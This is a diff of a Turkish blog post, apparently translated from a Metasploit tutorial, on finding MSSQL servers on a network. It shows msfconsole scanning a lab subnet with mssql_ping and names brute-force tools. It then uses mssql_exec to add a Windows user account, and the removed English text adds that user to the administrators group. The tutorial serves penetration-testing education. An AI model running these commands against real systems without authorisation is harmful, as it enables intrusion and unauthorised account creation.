@@ -4,7 +4,7 @@ title: MSF İçinde MSSQL Tarama
 date: 2017-05-16 08:10:06.000000000 +02:00
 type: post
 img: metasploit.jpg
-published: false
+published: true
 status: publish
 categories:
 - Nasıl
@@ -14,13 +14,16 @@ tags:
 - metasploit Framework
 - Metasploit Framework mssql tarama
 - msf mssql tarama
-excerpt: Payload, bir exploit modül türünü ifade eder. Metasploit Framework içerisinde 3 farklı grup payload modülü bulunur. Tekil, Sahneleyiciler ve Sahneler (Singles, Stagers ve Stages) olarak ayırabileceğimiz bu modüllere bakacağız. 
+excerpt: Metasploit Framework ün kullanıcıya sağladığı imkanlardan bir tanesi de dahil bulunduğunuz ağdaki diğer IP adreslerinde MSSQL kurulumunun olup olmadığını araştırabilmenizdir. Bunun için UDP tarama ile iz araması yapılır. 
 ---
 
-Searching for and locating MSSQL installations inside the internal network can be achieved using UDP foot-printing. When MSSQL installs, it installs either on TCP port 1433 or a randomized dynamic TCP port. If the port is dynamically attributed, querying UDP port 1434 will provide us with information on the server including the TCP port on which the service is listening.
+Metasploit Framework ün kullanıcıya sağladığı imkanlardan bir tanesi de dahil bulunduğunuz ağdaki diğer Ip adreslerinde MSSQL kurulumunun olup olmadığını araştırabilmenizdir. Bunun için UDP tarama ile iz araması yapılır. 
 
-Let us search for and load the MSSQL ping module inside the msfconsole.
+MSSQL ilk kurulduğunda varsayılan olara 1433 numaralı porttan dinleme yapar. Dinlemenin, 1433 portundan değil de rastgele seçilen portlardan yapılması ayarlanmış olabilir. Bu durumda da 1434 numaralı porta, dinlemenin hangi porttan yapıldığı sorulabilir. 
 
+Aşağıdaki örnekte, öncelikle içinde ```mssql``` ifadesi geçen modüller aranmaktadır. 
+
+```sh
 msf > search mssql
 
 Matching Modules
@@ -62,7 +65,11 @@ Matching Modules
    exploit/windows/mssql/mssql_payload_sqli                  2000-05-30       excellent  Microsoft SQL Server Payload Execution via SQL Injection
    post/windows/gather/credentials/mssql_local_hashdump                       normal     Windows Gather Local SQL Server Hash Dump
    post/windows/manage/mssql_local_auth_bypass                                normal     Windows Manage Local Microsoft SQL Server Authorization Bypass
+```
 
+Listelenen modüllerden ```auxiliary/scanner/mssql/mssql_ping``` isimli modülü kullanacağız. Aşağıdaki örnekte ```10.211.55.1/24``` IP adres aralığına MSSQL taraması yapılmaktadır.
+
+```sh
 msf > use auxiliary/scanner/mssql/mssql_ping
 msf auxiliary(mssql_ping) > show options
 
@@ -89,14 +96,11 @@ msf auxiliary(mssql_ping) > exploit
 [*] IsClustered = No
 [*] ServerName = SSHACKTHISBOX-0
 [*] Auxiliary module execution completed
-The first command we issued was to search for any ‘mssql‘ plugins. The second set of instructions was the ‘use scanner/mssql/mssql_ping‘, this will load the scanner module for us.
+```
 
-Next, ‘show options‘ allows us to see what we need to specify. The ‘set RHOSTS 10.211.55.1/24‘ sets the subnet range we want to start looking for SQL servers on. You could specify a /16 or whatever you want to go after. We would recommend increasing the number of threads as this could take a long time with a single threaded scanner.
+Sonuçta görüldüğü gibi ```10.211.55.128``` IP adresinde ve 1433 numaralı Portta MSSQL servisi çalışmaktadır. Bu noktadan sonra ```mssql_exec``` modülü kullanılarak **brute-force** denemeleri yapılabilir. Alternatif olarak medusa veya THC-Hydra kullanılabilir. 
 
-After the run command is issued, a scan is going to be performed and pull back specific information about the MSSQL server. As we can see, the name of the machine is “SSHACKTHISBOX-0” and the TCP port is running on 1433.
-
-At this point you could use the scanner/mssql/mssql_login module to brute-force the password by passing the module a dictionary file. Alternatively, you could also use medusa, or THC-Hydra to do this. Once you successfully guess the password, there’s a neat little module for executing the xp_cmdshell stored procedure.
-
+```sh
 msf auxiliary(mssql_login) > use auxiliary/admin/mssql/mssql_exec
 msf auxiliary(mssql_exec) > show options
 
@@ -117,11 +121,9 @@ msf auxiliary(mssql_exec) > set RHOST 10.211.55.128
 RHOST => 10.211.55.128
 msf auxiliary(mssql_exec) > set MSSQL_PASS password
 MSSQL_PASS => password
-msf auxiliary(mssql_exec) > set CMD net user bacon ihazpassword /ADD
-cmd => net user rel1k ihazpassword /ADD
+msf auxiliary(mssql_exec) > set CMD net user atom password /ADD
+cmd => net user atom password /ADD
 msf auxiliary(mssql_exec) > exploit
+```
 
-The command completed successfully.
-
-[*] Auxiliary module execution completed
-Looking at the output of the ‘net user bacon ihazpassword /ADD’, we have successfully added a user account named “bacon”, from there we could issue ‘net localgroup administrators bacon /ADD‘ to get a local administrator on the system itself. We have full control over the system at this point.
+Yukarıdaki örnekte, exploit başarılı olduğu takdirde, ```net user atom password /ADD``` komutunun gönderilerek MSSQL veri tabanına bir kullanıcı eklenmektedir. Bu komutun, ```set CMD net user atom password /ADD``` ile CMD değişkenine girildiğine dikkat edin.
